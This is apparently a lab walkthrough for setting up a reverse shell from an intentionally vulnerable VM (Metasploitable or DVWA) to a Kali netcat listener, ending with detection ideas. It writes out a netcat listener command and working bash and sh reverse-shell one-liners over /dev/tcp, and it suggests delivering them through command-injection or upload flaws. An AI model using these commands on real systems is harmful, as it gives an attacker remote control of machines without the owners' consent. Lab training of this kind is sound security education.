# 🐚 Reverse Shell - Kali Listener

This scenario demonstrates establishing a reverse shell from a vulnerable machine (e.g., Metasploitable or DVWA) to a Kali Linux listener. This is a common post-exploitation technique used to gain control over a compromised system.

## 🎯 Goal
- Exploit a vulnerable web service or app to spawn a reverse shell
- Connect back to Kali Linux for interactive control

## 🛠️ Tools Used
- Kali Linux (listener)
- Metasploitable or DVWA (victim)
- Netcat
- Web browser or pre-injected payload

## 🔍 Steps

1. Start a listener on Kali:
   ```bash
   nc -lvnp 4444
   ```

2. On the victim machine, run:
   ```bash
   bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
   ```

3. If delivered via a web form or payload:
   - Inject the command into an upload or text field
   - Or use a file inclusion/command injection vuln

4. On Kali, verify shell connection:
   - Run `whoami`, `uname -a`, `pwd` to confirm access

## 📝 Notes
- Adjust firewall or security settings if VM blocks reverse traffic
- Try alternate payloads if needed:
   ```bash
   /bin/sh -i >& /dev/tcp/<KALI_IP>/4444 0>&1
   ```

## 📊 Log & Detection Ideas
- Monitor Apache logs for suspicious input
- Watch for outbound connections to non-standard ports
- Use Wireshark to capture shell traffic for analysis

## 🧠 Learning Points
- Understand the mechanics of reverse shell attacks
- Practice listening, payload creation, and shell stability
- Learn what they look like in logs and traffic captures
